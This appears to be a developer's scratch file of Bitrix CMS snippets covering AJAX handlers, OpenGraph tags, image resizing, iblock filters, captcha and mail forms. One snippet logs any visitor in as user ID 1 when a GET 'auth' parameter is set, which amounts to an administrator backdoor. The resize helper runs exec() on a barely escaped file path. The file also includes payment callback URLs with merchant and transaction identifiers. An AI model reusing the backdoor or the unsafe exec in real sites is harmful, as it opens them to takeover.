							var html = $('<div>' + msg + '</div>').find(form.data('source')).html();
							if(!html) {
								html = '';
							}
							$(form.data('container')).html(html);
						}
						else {
							$(form.data('container')).html(msg);
						}
					}


				}
			});


		}

	});
	
	$('.catalog-filter-side .show-filter').on("click", function () {
		$(this).next('.filter-body').find('.hidden-filter').slideToggle();
	});

	if ($(window).width() <= '760'){
		$('.catalog-filter-side .catalog-filter-text').on("click", function () {
			$('.hidden-filter-block').slideToggle();
			$(this).toggleClass('active');
			/*if ($(this).hasClass('active')){
				$(this).find('span').html('⮝');
			} else {
				$(this).find('span').html('⮟');
			}*/
		});
	}

});


// дата
FormatDate('Y-m-d', MakeTimeStamp($arItem["DATE_CREATE"]));


Для Viber

<a href="viber://add?number=номер телефона">
телефон в формате +(код страны) номер. + заменить на %2B
<a href="viber://chat?number=+38xxxxxxxxxx">

Для Telegram

<a href="tg://resolve?domain=имя">

Для Whatsapp

<a href="whatsapp://send?phone=79xxxxxxxxx">


	$useragent = $_SERVER['HTTP_USER_AGENT'];

	$tmpl = '';
	if (preg_match('/(android|bb\d+|meego).+mobile|avantgo|bada\/|blackberry|blazer|compal|elaine|fennec|hiptop|iemobile|ip(hone|od)|iris|kindle|lge |maemo|midp|mmp|netfront|opera m(ob|in)i|palm( os)?|phone|p(ixi|re)\/|plucker|pocket|psp|series(4|6)0|symbian|treo|up\.(browser|link)|vodafone|wap|windows (ce|phone)|xda|xiino/i', $useragent) || preg_match('/1207|6310|6590|3gso|4thp|50[1-6]i|770s|802s|a wa|abac|ac(er|oo|s\-)|ai(ko|rn)|al(av|ca|co)|amoi|an(ex|ny|yw)|aptu|ar(ch|go)|as(te|us)|attw|au(di|\-m|r |s )|avan|be(ck|ll|nq)|bi(lb|rd)|bl(ac|az)|br(e|v)w|bumb|bw\-(n|u)|c55\/|capi|ccwa|cdm\-|cell|chtm|cldc|cmd\-|co(mp|nd)|craw|da(it|ll|ng)|dbte|dc\-s|devi|dica|dmob|do(c|p)o|ds(12|\-d)|el(49|ai)|em(l2|ul)|er(ic|k0)|esl8|ez([4-7]0|os|wa|ze)|fetc|fly(\-|_)|g1 u|g560|gene|gf\-5|g\-mo|go(\.w|od)|gr(ad|un)|haie|hcit|hd\-(m|p|t)|hei\-|hi(pt|ta)|hp( i|ip)|hs\-c|ht(c(\-| |_|a|g|p|s|t)|tp)|hu(aw|tc)|i\-(20|go|ma)|i230|iac( |\-|\/)|ibro|idea|ig01|ikom|im1k|inno|ipaq|iris|ja(t|v)a|jbro|jemu|jigs|kddi|keji|kgt( |\/)|klon|kpt |kwc\-|kyo(c|k)|le(no|xi)|lg( g|\/(k|l|u)|50|54|\-[a-w])|libw|lynx|m1\-w|m3ga|m50\/|ma(te|ui|xo)|mc(01|21|ca)|m\-cr|me(rc|ri)|mi(o8|oa|ts)|mmef|mo(01|02|bi|de|do|t(\-| |o|v)|zz)|mt(50|p1|v )|mwbp|mywa|n10[0-2]|n20[2-3]|n30(0|2)|n50(0|2|5)|n7(0(0|1)|10)|ne((c|m)\-|on|tf|wf|wg|wt)|nok(6|i)|nzph|o2im|op(ti|wv)|oran|owg1|p800|pan(a|d|t)|pdxg|pg(13|\-([1-8]|c))|phil|pire|pl(ay|uc)|pn\-2|po(ck|rt|se)|prox|psio|pt\-g|qa\-a|qc(07|12|21|32|60|\-[2-7]|i\-)|qtek|r380|r600|raks|rim9|ro(ve|zo)|s55\/|sa(ge|ma|mm|ms|ny|va)|sc(01|h\-|oo|p\-)|sdk\/|se(c(\-|0|1)|47|mc|nd|ri)|sgh\-|shar|sie(\-|m)|sk\-0|sl(45|id)|sm(al|ar|b3|it|t5)|so(ft|ny)|sp(01|h\-|v\-|v )|sy(01|mb)|t2(18|50)|t6(00|10|18)|ta(gt|lk)|tcl\-|tdg\-|tel(i|m)|tim\-|t\-mo|to(pl|sh)|ts(70|m\-|m3|m5)|tx\-9|up(\.b|g1|si)|utst|v400|v750|veri|vi(rg|te)|vk(40|5[0-3]|\-v)|vm40|voda|vulc|vx(52|53|60|61|70|80|81|83|85|98)|w3c(\-| )|webc|whit|wi(g |nc|nw)|wmlb|wonu|x700|yas\-|your|zeto|zte\-/i', substr($useragent, 0, 4))) {
		$tmpl = 'mob';
	}



<meta property="og:type" content="article"/>

// установка блока описаний opengraph для кнопок шеринга
$_shared_pic = $arResult["DETAIL_PICTURE"]["SRC"];
if(!$_shared_pic) $_shared_pic = $arResult["PREVIEW_PICTURE"]["SRC"];
$_shared_url = $arResult["DETAIL_PAGE_URL"];
$_shared_title = $arResult["NAME"];
$_shared_desc = strip_tags($arResult["PREVIEW_TEXT"]);
$APPLICATION->AddHeadString('<meta property="og:type" content="article"/>', true);
$APPLICATION->AddHeadString('<meta property="og:image" content="http://mktravelclub.ru'.$_shared_pic.'" />', true);
$APPLICATION->AddHeadString('<meta property="og:url" content="http://mktravelclub.ru'.$_shared_url.'" />', true);
$APPLICATION->AddHeadString('<meta property="og:title" content="'.$_shared_title.'" />', true);
$APPLICATION->AddHeadString('<meta property="og:description" content="'.$_shared_desc.'" />', true);
$APPLICATION->SetPageProperty("description", $_shared_desc);
// -------------------------------------


global $APPLICATION;

// установка блока описаний opengraph для кнопок шеринга
$_shared_pic = '/local/templates/elitelombard/assets/images/opengraph.jpg';
$_shared_url = $APPLICATION->GetCurPage();
$_shared_title = 'Элитный ломбард часов, ювелирных украшений, аксессуаров в Москве - ЭлитЛомбард';
$_shared_desc = strip_tags($APPLICATION->GetProperty("description"));

$APPLICATION->AddHeadString('<meta property="og:type" content="website"/>', true);
$APPLICATION->AddHeadString('<meta property="og:image" content="https://elite-lombard.ru'.$_shared_pic.'" />', true);
$APPLICATION->AddHeadString('<meta property="og:url" content="https://elite-lombard.ru'.$_shared_url.'" />', true);
$APPLICATION->AddHeadString('<meta property="og:title" content="'.$_shared_title.'" />', true);
$APPLICATION->AddHeadString('<meta property="og:description" content="'.$_shared_desc.'" />', true);
// -------------------------------------


$arMessage = MessageTable::getList(array(
    'order' => array('SORT' => 'ASC','ID' => 'ASC'),
    'select' => array('ID','TYPE','MESSAGE'),
    'filter' => array(
        '=ACTIVE' => 'Y',
        '?SITE_ID' => $siteId,
        'LOGIC' => 'AND',
        array(
            'LOGIC' => 'OR',
            '>=ACTIVE_TO' => new \Bitrix\Main\Type\DateTime(),
            'ACTIVE_TO' => null,
        ),
        array(
            'LOGIC' => 'OR',
            '<=ACTIVE_FROM' => new \Bitrix\Main\Type\DateTime(),
            'ACTIVE_FROM' => null,
        ),
    ),
))->fetchAll();




    /**
     * умный ресайз картинок
     * @param      $file
     * @param int  $width
     * @param int  $height
     * @param bool $trim
     * @param bool $ignoreMax
     *
     * @return string
     */
    public static function smartResize($file, $width = 1500, $height = 1500, $trim = false, $ignoreMax = false)
    {
        $root = $_SERVER['DOCUMENT_ROOT'];
        $file = $root . $file;
        if (!is_file($file)) {
            $file = $root . '/upload/nopic.jpg';
        };

        $ext = end(explode('.', $file));
        $ext = $ext == 'jpeg' ? 'jpg' : $ext;
        $sFileDest = md5($file) . '_' . $width . 'x' . $height;

        if ($trim) {
            $sFileDest .= 'tri';
        };

        $sDirDest = '/upload/resize/' . substr($sFileDest, 0, 2);
        if (!is_dir($root . $sDirDest)) {
            mkdir($root . $sDirDest);
        };

        $src = $sDirDest . '/' . $sFileDest . '.' . strtolower($ext);

        if (!is_file($root . $src) || !file_exists($root . $src) || filesize($root . $src) == 0) {
            unlink($root . $src);
        };
        //unlink($root . $src);
        if (!is_file($root . $src)) {
            self::funcImagemagickImgResize($file, $sDirDest, $sFileDest, $width, $height, $trim, $ignoreMax);
        };

        return $src;
    }


    /**
     * @param      $sFileSrc
     * @param      $sDirDest
     * @param      $sFileDest
     * @param      $iWidthMax
     * @param      $iHeightMax
     * @param bool $trim
     * @param bool $ignoreMax
     *
     * @return bool|string
     */
    protected static function funcImagemagickImgResize($sFileSrc, $sDirDest, $sFileDest, $iWidthMax, $iHeightMax, $trim = false, $ignoreMax = false)
    {
        $iHeightMax = (int)$iHeightMax;
        $iWidthMax = (int)$iWidthMax;

        $root = $_SERVER['DOCUMENT_ROOT'];

        if (!$ignoreMax) {
            if ($iHeightMax > 1500 || !$iHeightMax) $iHeightMax = 1500;
            if ($iWidthMax > 1500 || !$iWidthMax) $iWidthMax = 1500;
        }

        if (!($aSize = getimagesize($sFileSrc))) return false;

        switch ($aSize['mime']) {
            case 'image/png':
                $sFileDestExt = '.png';
                break;
            case 'image/gif':
                $sFileDestExt = '.gif';
                break;
            case 'image/jpeg':
                $sFileDestExt = '.jpg';
                break;
            default:
                return false;
                break;
        }

        if ($aSize[0] < $iWidthMax && $aSize[1] < $iHeightMax && !$trim) {
            copy($sFileSrc, $root . $sDirDest . "/" . $sFileDest . $sFileDestExt);
        } else {
            $command = "/usr/bin/convert '{$sFileSrc}' ";
            if ($trim) $command .= ' -fuzz "10%" -trim  ';

            $command .= " -resize {$iWidthMax}x{$iHeightMax} " . $root . $sDirDest . "/" . $sFileDest . $sFileDestExt;
            exec($command, $result, $error);

            if ($error) return false;
        }
        $result = $sDirDest . "/" . $sFileDest . $sFileDestExt;

        return $result;
    }

<?=\bh\service\Tools::smartResize($arItem['PREVIEW_PICTURE']['SRC'], 270, 190)?>
    

        <?php
        if ($_GET['auth']) {
            global $USER;
            $USER->Authorize(1);
        }
        ?>

<?
global $USER;
if ($USER->IsAdmin()) {


}
?>


 <script>
		        $(function () {
			        $(".show-more").on('click', function () {
				        $('.more-block').slideDown();
				        $('.more-container').hide();
			        });
		        });
 </script>
	        <script>
		        $(document).ready(function() {
			        var href = $('.rr-menu1').data('url');
			        console.log(href);
		        });
	        </script>




$this->__component->SetResultCacheKeys(array(
    "DETAIL_PAGE_URL",
    "PREVIEW_PICTURE",
    "DISPLAY_PROPERTIES"
));

в component_epilog.php

use Bitrix\Main\Page\Asset;

if (!empty($arResult["DETAIL_PAGE_URL"])) {
    Asset::getInstance()->addString('<meta property="og:url" content="https://' . $_SERVER['HTTP_HOST'] . '' . $arResult["DETAIL_PAGE_URL"] . '" />');
}

if (!empty($arResult['DISPLAY_PROPERTIES']['TYPE_OG'])) {
    Asset::getInstance()->addString('<meta property="og:title" content="' . $arResult['DISPLAY_PROPERTIES']['TITLE_OG']['VALUE'] . '" />');
}
if (!empty($arResult['DISPLAY_PROPERTIES']['TYPE_OG'])) {
    Asset::getInstance()->addString('<meta property="og:type" content="' . $arResult['DISPLAY_PROPERTIES']['TYPE_OG']['VALUE'] . '" />');
}
if (!empty($arResult['DISPLAY_PROPERTIES']['VIDEO_OG'])) {
    Asset::getInstance()->addString('<meta property="og:video" content="' . $arResult['DISPLAY_PROPERTIES']['VIDEO_OG']['VALUE'] . '" />');
}
if (!empty($arResult['PREVIEW_PICTURE']['SRC'])) {
    Asset::getInstance()->addString('<meta property="og:image" content="' . $arResult['PREVIEW_PICTURE']['SRC'] . '" />');
}


$bill = CIBlockElement::GetList(
			array('ID' => 'ASC'),
			array(
				'ID' => $id,
				'IBLOCK_ID' => $this->id,
			),
			false,
			array('nTopcount' => 1),
			array(
				'ID',
				'IBLOCK_ID',
				'PROPERTY_ORDER_ID',
				'PROPERTY_SCH_KOD',
				'PROPERTY_WAS_START_PAYMENT'
			)
		)->Fetch();
		if (!$bill) {
			throw new Exception('Счет не найден');
		}



SEO данные
	$arSeoProperties = new \Bitrix\Iblock\InheritedProperty\ElementValues(intval($arParams['IBLOCK_ID']),$arElement['ID']);
	$arSeoData = $arSeoProperties->getValues();

$ipropValues = new \Bitrix\Iblock\InheritedProperty\SectionValues($IBLOCK_ID,$ELEMENT_ID);
$IPROPERTY  = $ipropValues->getValues();



    /**
     * Возвращает иконку для отображения файла
     *
     * @param $fileName
     * @return string
     */
    public static function getFileIcon($fileName)
    {
        $result = Tools::getFileExtension($fileName['ORIGINAL_NAME']);
        if (!in_array(
            $result,
            array('pdf', 'ppt', 'jpg', 'png', 'tif', 'jpe', 'bmp', 'gif', 'doc', 'rtf', 'txt', 'xls', 'zip', 'rar')
        ))
        {
            $result = 'doc';
        }

        return $result;
    }


use Bitrix\Main\Data\Cache;




<?
$arFilter = (
...
"NAME" => false, //Не вернет ничего т.к. нет пустых NAME
"NAME" => "", //вернет все т.к. фильтр не будет применен
"NAME" => "А%", //вернет все NAME начинающиеся на "A"
"?NAME" => "(мама || мачеха) && (папа || отчим)", //Все имеют двух родителей
">NAME" => "э", //Все начинающиеся на Э, Ю, Я.
...
);

// исключение из выборки всех записей, в названиях которых есть вхождения jpg, jpeg и png
$arFilter = array(
  "IBLOCK_ID"=>$IBLOCK_ID,
  "ACTIVE_DATE"=>"Y",
  "ACTIVE"=>"Y",
  "!NAME" => array("%.jpg%", "%.jpeg%", "%.png%")
);
//Есть очень большой каталог, несколько тысяч
//нужно сделать выбор по двум словам (например, "Citroen" и "Berlingo"), которые могут содержаться в одном из пользовательских свойств элементов.
//Как сделать через маску? 

//1-ый вариант маски:
$arFilter['PROPERTY_a_use'] = "%Citroen%Berlingo%";

//2-ой вариант маски:
$arFilter['?PROPERTY_a_use'] = "Citroen && Berlingo";

//Запрос
$getListFirst = CIBlockElement::GetList($arOrder, $arFilter, false, false, $arSelect);

//По производительности 2-ой вариант хуже, так как 1-ый вариант - это обычный LIKE запрос к БД, в то время как 2-ой вариант делает переработку фильтра запроса  
//С другой стороны, если в 1-ом варианте поменять местами слова, то ничего не найдется, а во 2-ом - должно сработать.



		$salt = implode(':', [__CLASS__, __FUNCTION__]);
		$code = substr(md5($number . $salt), 0, 8);






$response = json_decode(json_encode($wdsl->client->putContracts($arParams)), true);



Loader::includeModule('iblock');

$arResult['SECTION_LIST'] = [];
if ($sections = SectionTable::getList([
    'select' => [
        'ID',
        'NAME',
        'IBLOCK_ID',
        'IBLOCK_SECTION_ID',
        'ACTIVE',
        'SORT',
        'DESCRIPTION'
    ],
    'filter' => [
        'IBLOCK_ID' => $arResult['ID'],
        'ACTIVE' => 'Y',
        'GLOBAL_ACTIVE' => 'Y',
    ],
    'order' => [
        'SORT' => 'ASC'
    ]
])
) {
    while ($section = $sections->fetch()) {
        $arResult['SECTION_LIST'][$section['ID']] = $section;
    }
}

$GLOBALS["arrFilter"]["SECTION_ID"] = $sectionData['ID'];

	global $arCategoryFilter;
	$arCategoryFilter = ['=SECTION_ID' => $sectionData['ID']];




	    $.ajax({
		    type : 'POST',
		    url : "/local/components/webway/calc.ajax.php",
		    dataType: 'json',
		    data : $("#form-step1").serialize()+'&ADD_SUMM_DATA=Y',
		    success : function(data) {
			    
		    },
		    error: function (response) {
			    console.log(response);
		    }
	    });



https://direct.sogaz.ru.alfa.webway.ru/payment/fail.php?trx_id=423AE753037A58DB4CEF16B2B84B7CAE&merch_id=5DCE4D94E8101DFC69BFB58C8572ED50&result_code=1&amount=100&account_id=2515B7D83B20EE1F651A38B8B07845BD&o.code=1818-99PP001187&o.order_id=51611&p.authcode=299116&p.transmissionDateTime=0626160524&p.isFullyAuthenticated=Y&p.maskedPan=900000xxxxxxxxx0001&p.rrn=817713624786&ts=20180627+11%3A13%3A33&signature=afZNfRr089J0OkoZBwnMSI2fdnzPiwQv7Md4L+rbZqwPi/N+NV1oKnzEGO6OGV7eptSyWsqhIBWBfIZCWYo+igiji0bgTQkkYn9a6V/AivpBbdvHF6mvZRJqfl+Kvsk1BSLJTXAR7ZNpBSrPrMNDUN1d3En1Gt7jnPhmeY62coQ10n/v85/SMoWj3pZP0i4Co96d4+9mlH9Kz4zk21Chmz/LU/1/QpEO8lwLD/ISwSJxRnaSbqSWcJmjBanKlR58I5hbbsACRJmCAEe+5EuqeffFtI8wVvBYheDR6Tz/ZhSXLH+fqOxQX29FdMia84J19Lsp5DIpDVuC3UTdhVNZvw==




https://direct.sogaz.ru.alfa.webway.ru/payment/paid.php?trx_id=4B4B48C8184E4DD5306F21AC51A25B11&merch_id=5DCE4D94E8101DFC69BFB58C8572ED50&result_code=1&amount=100000&account_id=2515B7D83B20EE1F651A38B8B07845BD&o.code=51668&o.order_id=51668&p.authcode=299116&p.transmissionDateTime=0626160524&p.isFullyAuthenticated=Y&p.maskedPan=900000xxxxxxxxx0001&p.rrn=817713624786&ts=20180710+08%3A13%3A33&signature=YV+1MAWoH+wdgLybhwWfXeGaqwarUTmnefkYcDvqWK39cIBz4s6AJ6hMHYMdiEet7BvHf3Z8P1XuFyvrpyZmVg/Dvt66qJMQINnFePZK1k23XoxVxu5itfLIKVe6kktu1NXlGrbJG7iZi8yg9QOskmQrkYrfrHtBOHznVZg1+kcaEcfvopaNC58LB4S6HZqL4Y8PsOvgnFlGxv0GSKch+RR1023z4V3gazOikHKy8SM+TZ7kqldO1qsx9ht3mEx0CHHEjtFPWic7VUqJbrNu6LWnS1oBCwKINeSlOELwwY1LbRXBRz6Vcl+mqMn9dUzgdDeJghPGFvlF7ra2sggW2Q==


https://shop.sogaz.ru/payment/result.php?trx_id=057CE53B94E39B66A26F2FC8D477C324&merch_id=77F989B0CEE9BB18BB1373074455CD69&o_order_id=52331



https://direct.sogaz.ru.alfa.webway.ru/payment/paid.php?trx_id=B46E1D634422B8651D5E42E7F331D56B&merch_id=5DCE4D94E8101DFC69BFB58C8572ED50&result_code=1&amount=100000&account_id=2515B7D83B20EE1F651A38B8B07845BD&o.code=2319-99PP000007&o.order_id=53030&p.authcode=299116&p.transmissionDateTime=0626160524&p.isFullyAuthenticated=Y&p.maskedPan=900000xxxxxxxxx0001&p_storage_card_ref=6A917941C7DC9C68EDB2A206C14E36EC&p_storage_card_recurrent=Y&p.rrn=817713624786&ts=20180710+08%3A13%3A33&signature=aL2I93vG2iTAozx+rTUL8GVxiGZOQG0GDRYHcx/3GbEhEE23oKwvkkHhU5uapLQ2SSkbFozNWpe/Mdz065eEKx16/Zzj0eNX6EUjtK2zWdIedsjSQAXigRXIO4ssFYYXqg37ukH+mKxtyICjAEbLBD9NLsU6tlpKntsm71/LY2qYpMrrmAIail9KZOjP2JMd6+eNZmP8UBZ6cnl7+zrROFYBt6syIRd3iFDC3J467xX4a+kLndJdr1bwtBzbSbkKia5akLcN95VCp83pyJ0MsO1NqGoYxVMJ734/jO/iSDxsJWLQXhBFUU5OerFCYFSiKo2iEL4CzM+Spuak+8lRRQ==

1 фаза
https://shop.sogaz.ru/payment/result.php

2 фаза
https://shop.sogaz.ru/payment/paid.php


<a href="<?=$APPLICATION->GetCurPageParam("sort_order=".($_REQUEST['sort_order'] == 'asc' ? 'desc' : 'asc')."&sort_by=name".($_REQUEST['cat'] ? '&cat=' . $_REQUEST['cat'] : ''), ['sort_by', 'sort_order', 'cat']);?>" class="links-sorting">
                                    <!-- <span class="icon-nazvaniya"></span> -->
                                </a>


				$datetime = \DateTime::createFromFormat('d.m.Y', $data['date_start']);
				$datetime2 = \DateTime::createFromFormat('d.m.Y', $data['birthday']);
				$datetime2->modify('+14 year');
				if ($datetime<$datetime2) {
					$fields['date_start'] = "Дата выдачи паспорта некорректна: паспорт не может быть выдан ранее 14-ти лет с даты рождения";
				}

			$now = new \DateTime(date());
			$birthday = \DateTime::createFromFormat('d.m.Y', $data['birthday']);
			$date_start = \DateTime::createFromFormat('d.m.Y', $data['date_start']);

			$interval = $now->diff($birthday);
			$age = (int) $interval->format("%Y");



$beginDate = $endDate = '0001-01-01T00:00:00';


.feedback input[name=f_surname], .feedback input[name=f_fax] {
	position: absolute;
	z-index: -1;
}



            'Name' => implode(' ', array_filter(array(
                $this->data['UF_INSURER_LAST_NAME'],
                $this->data['UF_INSURER_NAME'],
                $this->data['UF_INSURER_SNAME']
            ))),


<?if (isset($_POST['email']) && isset($_POST['allzakaz'])) {?>
 
	<?
	//проверяем на наличие значений в массиве $_POST
	if (isset($_POST['name'])) $name = $_POST['name'];
	if (isset($_POST['email'])) $email = $_POST['email'];
	if (isset($_POST['tel'])) $phone = $_POST['tel'];
	if (isset($_POST['allzakaz'])) $allzakaz = $_POST['allzakaz'];
	if (isset($_POST['allcoll'])) $allcoll = $_POST['allcoll'];
	if (isset($_POST['allprice'])) $allprice = $_POST['allprice'];
	?>
 
	<?
	//формируем массив с параметрами 18, 19 и т.д. ID полей
	$arValues = array (
		"form_hidden_18" => $name,
		"form_hidden_19" => $email,
		"form_hidden_20" => $phone,
		"form_hidden_22" => $allcoll,
		"form_hidden_23" => $allprice,
		"form_hidden_24" => $allzakaz
	);
	?>
 
	<?
	//задаем ID нашей формы, можно глянуть в админке
	$FORM_ID = 4;
	//подключаем модуль форм, т.к. без него скорей всего будет ошибка
	CModule::IncludeModule("form");
 
	//если результат добавился в веб форму, передаем ID и поля
	if ($RESULT_ID = CFormResult::Add($FORM_ID, $arValues)) {
 
		//пишем примитивный текст письма
		$message = $name.", ваш заказ подтвержден. В ближайшее время с вами свяжется менеджер.\n\nСостав заказа:\n".$allzakaz;
		//отправляем письмо на email который пользователь ввел в нашей форме
		mail($email, "Подтвержден заказ номер $RESULT_ID на site.ru", $message, "From: info@site.ru");
		//параметры (кому отправить, тема письма, сообщение, от кого)
 
	}
	?>
 
<?}?>


$beginDate = date("Y-m-d", strtotime($arUserData['paydate'] . " +14 days"));



  array (
    'value' => 
    array (
      'debug' => true,
      'handled_errors_types' => 4437,
      'exception_errors_types' => 4437,
      'ignore_silence' => false,
      'assertion_throws_exception' => true,
      'assertion_error_type' => 256,
      'log' => array (
	      'settings' => array (
		      'file' => 'bitrix/modules/error.log',
		      'log_size' => 1000000,
	      ),
      ),
    ),
    'readonly' => false,
  ),


	$('body').on('change', '.js-ajax-form-submit', function(){
		var form = $(this);

		var data = '';

		var year = $('select[name="year"]').val();

		$.ajax({
			url: form.attr('action'),
			type: 'GET',
			data: form.serialize() + '&' + data,
			dataType: "html",
			success: function(data) {
				$('.ajax_block').html(data);

				$('.js-ajax-form-submit h3').text(year);
			}
		});

	});

if ($_REQUEST['popup'] == 'Y')
{
ob_start();
$APPLICATION->IncludeFile($APPLICATION->GetCurDir() . 'detail.php');
$OB_OUT = ob_get_contents();
ob_end_clean();
}

if ($_REQUEST["AJAX"] == "Y"):
	$GLOBALS['APPLICATION']->RestartBuffer();
endif;
?>
<div id="fourth_text" class="ajax_pagen two-thirds"> 	 
	<a href="#" class="close_third"></a>
	<?$APPLICATION->IncludeComponent(
		"aic.robotics:press",
		"",
		Array(
			"IBLOCK_TYPE" => "pressroom",
			"IBLOCK_ID" => "2",
			"IBLOCK_SECTION_ID" => "33"
		)
	);?>
</div>
<script type="text/javascript">
 document.title = "Пресс-релизы";
</script><?
if ($_REQUEST["AJAX"] == "Y"):
	die();
endif;



<?if(
							CSite::InDir('/catalog/rasprodazha_ostatkov_instrument_otoplenie_ventilya/') ||
							CSite::InDir('/catalog/kontrolno_izmeritelnye_pribory/') ||
							CSite::InDir('/catalog/lestnitsy_stremyanki_vyshki_tury/') ||
							CSite::InDir('/catalog/sredstva_individualnoy_zashchity_i_okhrana_truda_o/') ||
							CSite::InDir('/catalog/ustroystva_zakladki_kabelya/') ||
							CSite::InDir('/catalog/elektricheskie_payalniki_gazovye_gorelki_i_payalny/') ||
							CSite::InDir('/catalog/ruchnoy_instrument_zamki_navesnye/') ||
							CSite::InDir('/catalog/otvertki_klyuchi_nabory_instrumentov_yashchiki_i_s/') ||
							CSite::InDir('/catalog/press_kleshchi_gubtsevyy_instrument_instrument_dlya/') ||
							CSite::InDir('/catalog/elektroinstrument_sverla_bury_koronki_krugi_otrezn/')
						):?>
							<div class="banner_catalog">
								<a href="/about/news/rasshirenie-assortimenta-instrumenta-wiha-germaniya/"><img style="width: 100%;" src="<?=SITE_TEMPLATE_PATH?>/_pic/banner.jpg"/></a>
							</div>
						<?endif;?>


	// фильтр по стикерам
	if ($_REQUEST['type']) {
		$type = htmlspecialchars(trim($_REQUEST['type']));

		$stickersId = \CIBlockElement::GetList([], ["IBLOCK_ID" => 11, "CODE" => $type, "ACTIVE" => "Y"], false, false, ['ID'])->GetNext();

		$arFilter = array(
			"IBLOCK_ID" => 5,
			array(
				"LOGIC" => "OR",
				array('=PROPERTY_MAIN_STIKER' => $stickersId['ID']),
				array('=PROPERTY_STIKERS' => $stickersId['ID']),
			),
		);
	}

<?

$resultSend = CEvent::Send(
	'OFFER_REQUEST_SEND',
	's1',
	array(
		'TEXT' => sprintf(
			'Ф.И.О.: %s<br>Телефон: %s<br><br>Автомобиль: %s<br>Классическое Каско: %s<br>Каско с франшизой: %s<br>Каско «на крайний случай»: %s<br>
Страховая сумма: %s<br><br><br><b>Дополнительные услуги:</b><br><br>Сбор справок: %s<br>Услуга «Аварийный комиссар»: %s<br><br><br>
<b>Данный расчет произведен при условии, что:</b><br><br>Место регистрации ТС: %s<br>Лица допущенные к управлению возраст/стаж: %s/%s<br>
Класс КБМ ОСАГО у всех допущенных к управлению ТС водителей (согласно АИС РСА) не ниже: %s<br><br><br>%s<br><br><br>
Данное предложение действует до: %s<br>',
			$data['data']['pholder_name'],
			$data['phone'],
			sprintf('%s %s %s г.в.', $data['data']['mark_ts'], $data['data']['model_ts'], $data['data']['gv_ts']),
			$data['data']['kasko_prise'],
			$data['data']['kasko_prise_fr'],
			$data['data']['kasko_prise_kray'],
			$data['data']['prise_ts'],
			$data['data']['spravki'],
			$data['data']['avarkom'],
			$data['data']['teritor_ts'],
			$data['data']['driver_age'],
			$data['data']['driver_exp'],
			$data['data']['kbm'],
			$data['data']['ps'],
			$data['data']['end_date']
		)
	)
);


try {

			// добавить коммент в хайлоад
			parse_str($_POST['data'], $arData);

			$text .= '<h3>Заказ обратного звонка</h3><br><br>';
			$text .= 'Автор: '. htmlspecialchars($arData['name']).'<br><br>';
			$text .= 'Телефон: '. htmlspecialchars($arData['phone']).'<br><br>';

			$arFieldsEmail = array(
				'THEME' => 'Заказ обратного звонка',
				'TEXT' => $text,
				'EMAIL_TO' => self::DEFAULT_EMAIL,
			);

			\CEvent::SendImmediate("ADD_MESSAGE", 's1', $arFieldsEmail);

			// забить данные в кукис
			SetCookie('ALVE_NAME', htmlspecialchars($arData['name']), time()+2592000, "/");
			SetCookie('ALVE_PHONE', htmlspecialchars($arData['phone']), time()+2592000, "/");

			return $res;

		} catch (\Exception $e) {
			Util::log($e);
		}


define('AGIMA_GLOBAL_CACHE_TIME', 3600);
// ИБ страховых продуктов для частных клиентов
define('IBLOCK_PRODUCTS_PRODUCTS', 63); // Частным клиентам: Страховые продукты

// Справочники
define('IBLOCK_REFERENCES_BRANCH', 41); // Справочники: XML Округи (Подразделения СОГАЗа)
define('IBLOCK_REFERENCES_PRODUCT', 40); // Справочники: XML Страховые продукты (Продукты СОГАЗа)
define('IBLOCK_REFERENCES_PRODUCT_TYPE', 39); // Справочники: XML Линии страхования (Виды продуктов СОГАЗа)
define('IBLOCK_REFERENCES_XML_MESSAGE_TYPE', 38); // Справочники: XML Тип сообщения (тип сообщения для последющей передачи в сервис)

if (file_exists($_SERVER['DOCUMENT_ROOT'] . '/vendor/autoload.php')){
	require_once $_SERVER['DOCUMENT_ROOT'] . '/vendor/autoload.php';
}

    function checkStatus(url, id, showError, timeout) {
        $.ajax({
            url: url,
            type: 'post',
            data: {
                'sessid': BX.bitrix_sessid(),
                'action': 'check',
                'id': id

            },
            success: function(data) {
                data = data || {};
                if (data['result'] && data['url']) {
                    window.location.href = data['url'];
                } else {
                    if (data['errors']) {
                        showError();
                    } else {
                        setTimeout(function() {
                            checkStatus(url, id, showError, timeout);
                        }, timeout);
                    }
                }
            },
            error: function() {
                setTimeout(function() {
                    checkStatus(url, id, showError, timeout);
                }, timeout);
            }
        });
    }


echo Bitrix\Main\Config\Option::get('sogaz.main', 'CHECK_REQUEST_WSDL', '');



				$mailFields = [
					'ID' => $id,
				];

				(new CEvent)->Send(
					'SIEBEL_REQUEST',
					SITE_ID,
					$mailFields,
					'Y',
					'',
					$fields['PROPERTY_VALUES']['FILE_ID'] ?: []
				);


				в письме
				$arParams['ID']


?>
<?

                $('#reloadCaptcha').click(function(){
                    $.getJSON('<?= SITE_DIR ?>reload_captcha.php', function(data) {
                        $('#captchaImg').attr('src','/bitrix/tools/captcha.php?captcha_sid='+data);
                        $('#captchaSid').val(data);
                    });
                    return false;
                });


require($_SERVER["DOCUMENT_ROOT"]."/bitrix/header.php");
// если без шаблона, то
//require($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/include/prolog_before.php"); 

if($_SERVER["REQUEST_METHOD"]=="POST")
{
   if (!$APPLICATION->CaptchaCheckCode($_REQUEST["captcha_word"], $_REQUEST["captcha_sid"]))
   {
      echo "Неверно введены символы с картинки";
   }
   else
   {
      echo "Верно введены символы с картинки";
   }
}

$captcha_code = htmlspecialchars($APPLICATION->CaptchaGetCode());

?>
<form method="post" action="">
<input type="hidden" name="captcha_sid" value="<?=$captcha_code?>" />
<img src="/bitrix/tools/captcha.php?captcha_sid=<?=$captcha_code?>" width="133" height="29" alt="CAPTCHA" />
<input type="text" name="captcha_word" />
<input type="submit" value="Проверить CAPTCHA" />
</form>
<?


require($_SERVER["DOCUMENT_ROOT"]."/bitrix/footer.php");
// если без шаблона, то
//require($_SERVER["DOCUMENT_ROOT"]."/bitrix/modules/main/include/epilog_after.php"); 
?>

<? $captcha_code = htmlspecialchars($APPLICATION->CaptchaGetCode()); ?>
				<div class="row">
					<div class="col-sm-4 col-9">
						<div class="captcha_img">
							<img src="/bitrix/tools/captcha.php?captcha_sid=<?=$captcha_code?>" class="form__captcha" width="133" height="30" alt="captcha">
						</div>
						<a id="change_captcha" data-url="/ajax/recaptcha.php" href="#">Показать другие символы</a>
						<div class="invalid-feedback"></div>
					</div>

					<div class="col-sm-4 col-9">
						<input type="hidden" name="captcha_sid" value="<?=$captcha_code?>" />
						<input class="form-control" type="text" value="" id="captcha" name="captcha_word" data-required>
